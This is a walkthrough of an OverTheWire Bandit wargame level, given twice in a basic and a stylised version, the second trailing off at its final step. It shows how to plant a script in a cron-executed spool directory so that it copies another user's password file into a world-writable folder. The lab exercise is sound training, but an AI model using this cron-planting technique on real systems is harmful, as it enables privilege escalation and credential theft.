DESCRIPTION
A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration 
and see what command is being executed.
NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you
beat this level!
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

COMMANDS YOU MAY NEED:
chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)

STEPS
1. cd /etc/cron.d
2. ls -l : to list all files/directories
3. cat cronjob_bandit23
4. cat /usr/bin/cronjob_bandit23.sh: to see the content of the script.
5. cd ~ : Change directory back to home directory.
6. mktemp -d :to create a temporary directory
7. touch password :create a new file called password where the password would be stored.
8. nano myfirstscript.sh
9. Type these in the script file
 #!/bin/bash
 cat /etc/bandit_pass/bandit24 > /tmp/tmp.7XDAdkIYh5/password
10. Save file and exit text editor.
11. chmod 777 -R /tmp/tmp.7XDAdkIYh5: change permission to give any user read,write and execute privilege to the folder and any file/folder 
under it.
12. cp myfirstscript.sh /var/spool/bandit24/foo : copy the script file to the location where the cron job scheduler script will execute it.

### **STEPS**  

1️⃣ **Navigated to the cron job directory:**  
   ```bash
   cd /etc/cron.d
   ```  
   I wanted to check if there was a scheduled task running as `bandit24`.  

2️⃣ **Listed the files:**  
   ```bash
   ls -l
   ```  
   This showed me the cron job file managing automated tasks.  

3️⃣ **Checked the cron job script:**  
   ```bash
   cat cronjob_bandit23
   ```  
   From this, I learned that it runs `/usr/bin/cronjob_bandit23.sh`.  

4️⃣ **Read the script content:**  
   ```bash
   cat /usr/bin/cronjob_bandit23.sh
   ```  
   It showed that anything placed in `/var/spool/bandit24/` would be executed as `bandit24`!  

---

### **Creating My Own Exploit Script**  

5️⃣ **Changed back to the home directory:**  
   ```bash
   cd ~
   ```  

6️⃣ **Created a temporary directory:**  
   ```bash
   mktemp -d
   ```  
   This ensured I had a **safe working directory**.  

7️⃣ **Created a file where the password would be stored:**  
   ```bash
   touch password
   ```  

8️⃣ **Opened a text editor to write the script:**  
   ```bash
   nano myfirstscript.sh
   ```  

9️⃣ **Wrote this script inside `myfirstscript.sh`:**  
   ```bash
   #!/bin/bash
   cat /etc/bandit_pass/bandit24 > /tmp/tmp.7XDAdkIYh5/password
   ```  
   This script **copies the password** into a file where I can access it.

### **Giving My Script Proper Permissions & Execution**  

1️⃣1️⃣ **Made sure my directory and files were accessible:**  
   ```bash
   chmod 777 -R /tmp/tmp.7XDAdkIYh5
   ```  
   This ensured **any user** (including `bandit24`) could write to the password file.  

1️⃣2️⃣ **Copied my script to the cron job execution directory:**

   Now, when the cron job runs, it **executes my script**, allowing me to retrieve the password from my temporary directory!
